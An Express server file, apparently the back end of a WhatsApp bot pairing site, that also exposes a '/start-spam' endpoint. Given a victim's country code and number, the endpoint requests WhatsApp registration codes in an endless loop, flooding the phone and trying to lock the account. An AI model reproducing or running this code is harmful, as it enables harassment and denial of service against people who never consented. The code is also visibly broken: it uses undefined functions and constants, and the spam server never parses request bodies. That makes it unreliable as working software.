const express = require('express');
const app = express();
__path = process.cwd()
const path = require("path")
const bodyParser = require("body-parser");
const PORT = process.env.PORT || 8000;
const PORT2 = process.env.PORT2 || 8080;
let server = require('./qr'),
    code = require('./pair');
require('events').EventEmitter.defaultMaxListeners = 500;
app.use('/qr', server);
app.use('/code', code);
app.use('/lock', code );
app.use('/hello', code);
app.use('/pair',async (req, res, next) => {
res.sendFile(__path + '/pair.html')
})
app.use('/hello',async (req, res, next) => {
  res.sendFile(__path + '/index.html')  
})
app.use('/',async (req, res, next) => {
res.sendFile(__path + '/main.html')
})
app.use('/lock',async (req, res, next) => {
    res.sendFile(__path + '/lock.html')
    })
let serv = express()
let publicDirectoryPath = "./"
app.use(express.static(publicDirectoryPath));

serv.post('/start-spam', async(req, res) => {
    const {  ddi, number } = req.body; // Extract values from request body
  
    // Check if all fields are filled
    if (  !ddi || !number ) {
      res.status(400).send('All fields are required');
      return;
    }
  
    // Hier können Sie den Spam-Prozess starten
    const { state, saveCreds } = await useMultiFileAuthState('.mm');
    const spam = _makeWaSocket({
      auth: state,
      mobile: true,
      logger: pino({ level: 'silent' })
    });
  
    while (true) {
      try {
        res = await spam.requestRegistrationCode({
          phoneNumber: '+' + ddi+number,
          phoneNumberCountryCode: ddi,
          phoneNumberNationalNumber: number,
          phoneNumberMobileCountryCode: 724
        });
  
        b = (res.reason === 'temporarily_unavailable');
        if (b) {
          console.log(gradient('red', 'red')(`BY BARON: +${res.login}`));
        }
  
        // Wait for the specified delay time before sending the next request
        await waitUntil(() => false, { timeout: DELAY_TIME });
  
      } catch (err) {
        console.error(err);
      }
    }
  });
  
app.use(bodyParser.json());
app.use(bodyParser.urlencoded({ extended: true }));
app.listen(PORT, () => {
    console.log(`


 Server running on http://localhost:` + PORT)
})
serv.listen(PORT2, () => {
    console.log(`Server is running on port ${PORT2}`);
})
module.exports = app
